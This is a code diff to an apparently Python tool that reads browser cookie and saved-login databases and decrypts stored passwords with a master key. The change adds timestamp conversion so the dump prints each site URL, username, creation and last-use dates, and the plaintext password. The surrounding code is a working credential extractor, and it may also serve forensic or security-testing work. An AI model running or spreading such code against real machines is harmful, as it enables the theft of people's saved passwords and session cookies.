@@ -8,6 +8,10 @@ import binascii
 import json
 from datetime import datetime, timedelta
 from pyasn1.codec.der import decoder
+from datetime import datetime, timedelta
+
+def filetime_to_datetime(ts):
+    return datetime(1601, 1, 1) + timedelta(microseconds=ts)
 
 def cookies(key, master_key, file_location):
     if os.path.isfile(file_location) == False:
@@ -73,11 +77,14 @@ def login_data(key, master_key, file_location):
     try:
         conn = sqlite3.connect(file_location)
         cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used, date_password_modified  FROM logins")
         values = cursor.fetchall()
-        for origin_url, username_value, password_value in values:
+        for origin_url, username_value, password_value, date_created, date_last_used, date_password_modified in values:
             print("URL: " + origin_url)
             print("Username: " + username_value)
+            print("Created: " + str(filetime_to_datetime(date_created) ))
+            print("Last used: " + str(filetime_to_datetime(date_last_used) ))
+            print("Last modified: " + str(filetime_to_datetime(date_password_modified) ))
             print("Password: " + decrypt_data(password_value, key,master_key, True))
             print("")
     except sqlite3.Error as e:
